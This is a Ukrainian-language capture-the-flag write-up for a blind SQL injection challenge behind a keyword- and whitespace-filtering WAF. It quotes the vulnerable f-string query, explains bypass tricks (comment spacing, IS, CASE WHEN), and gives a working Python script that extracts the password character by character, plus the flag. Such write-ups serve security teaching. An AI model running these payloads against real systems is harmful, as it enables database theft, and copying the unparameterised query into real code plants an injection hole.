# 07. Blind SQLi WAF (400 балів) — розв'язок

Прапор: `CTF{bl1nd_sqli_w4f_byp4ss_m4st3r}`

## Вразливість

Параметр `id` підставляється у SQL-запит без параметризації:

```python
res = db.execute(f"SELECT username FROM users WHERE id = {uid}").fetchone()
```

WAF забороняє пробільні символи, `=`, `<`, `>` та слова `union`, `or`, `and`.
Відповідь застосунку — лише «User exists» / «User not found», тобто ін'єкція сліпа.

## Обхід WAF

- замість пробілів — SQL-коментарі `/**/`;
- замість `=` — оператор `IS`;
- замість `AND/OR` — `CASE WHEN ... THEN ... ELSE ... END`;
- для порівняння символу — `substr((SELECT password FROM users), pos, 1) IS 'x'`.

Шаблон payload:

```sql
(CASE/**/WHEN/**/substr((SELECT/**/password/**/FROM/**/users),POS,1)/**/IS/**/'CH'/**/THEN/**/1/**/ELSE/**/0/**/END)
```

Якщо умова істинна, підзапит повертає `1`, рядок `id = 1` існує → «User exists».

## Експлойт

```python
import requests, string

BASE = "http://10.10.15.124:8007"          # через VPN: http://172.28.0.17:5000
CHARS = string.ascii_letters + string.digits + "{}_!@#$%^&*()-+"

def check(pos: int, ch: str) -> bool:
    payload = (
        f"(CASE/**/WHEN/**/substr((SELECT/**/password/**/FROM/**/users),{pos},1)"
        f"/**/IS/**/'{ch}'/**/THEN/**/1/**/ELSE/**/0/**/END)"
    )
    r = requests.get(BASE, params={"id": payload})
    return "User exists" in r.text

flag = ""
for pos in range(1, 64):
    for ch in CHARS:
        if check(pos, ch):
            flag += ch
            print(flag)
            break
    else:
        break
print("flag:", flag)
```

## Прапор

```text
CTF{bl1nd_sqli_w4f_byp4ss_m4st3r}
```
